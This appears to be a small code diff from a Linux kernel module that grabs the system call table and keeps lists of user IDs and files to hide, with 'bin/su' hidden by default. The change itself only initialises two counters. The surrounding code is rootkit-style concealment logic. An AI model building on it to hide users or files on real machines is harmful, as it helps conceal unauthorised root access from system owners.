@@ -18,11 +18,11 @@
 unsigned long **sys_call_table;
 
 int hide_uid[100];
-int hide_uid_count;
+int hide_uid_count=0;
 module_param_array_named(hide_uid, hide_uid, int, &hide_uid_count, 0);
 
 char *hide_file[100] = {"bin/su", };
-int hide_file_cnt;
+int hide_file_cnt=1;
 module_param_array_named(hide_file, hide_file, charp, &hide_file_cnt, 0);
 
 int check_hide_uid(void)
